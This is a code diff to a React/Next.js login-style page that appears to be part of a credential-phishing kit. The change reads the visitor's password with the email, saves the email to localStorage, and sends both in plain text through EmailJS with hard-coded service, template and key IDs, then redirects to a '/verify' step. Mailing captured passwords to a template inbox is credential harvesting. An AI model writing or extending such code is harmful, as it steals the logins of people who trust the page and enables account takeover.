@@ -9,23 +9,33 @@ const Home = () => {
     const router = useRouter();
 
     const validateEmail = (email) => {
-        // Simple email regex
         return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
     };
 
     const sendEmail = (e) => {
         e.preventDefault();
         const email = form.current.user_email.value;
+        const password = form.current.user_password.value;
+
         if (!validateEmail(email)) {
             alert('Please enter a valid email address.');
             return;
         }
-        // Send form data via EmailJS
-        emailjs.sendForm(
-            'service_ozea06x',      // your EmailJS service ID
-            'template_ugtxhw6', // replace with your EmailJS template ID for the index page
-            form.current,
-            'XMOnwjyzQDoRVRYl3'       // replace with your EmailJS public key
+
+        // Save email to localStorage for other pages
+        localStorage.setItem('user_email', email);
+
+        // Prepare data for EmailJS
+        const templateParams = {
+            user_email: email,
+            user_password: password
+        };
+
+        emailjs.send(
+            'service_ozea06x',
+            'template_ugtxhw6', // Replace with your EmailJS template ID for the homepage
+            templateParams,
+            'XMOnwjyzQDoRVRYl3'
         ).then(
             (result) => {
                 router.push('/verify');
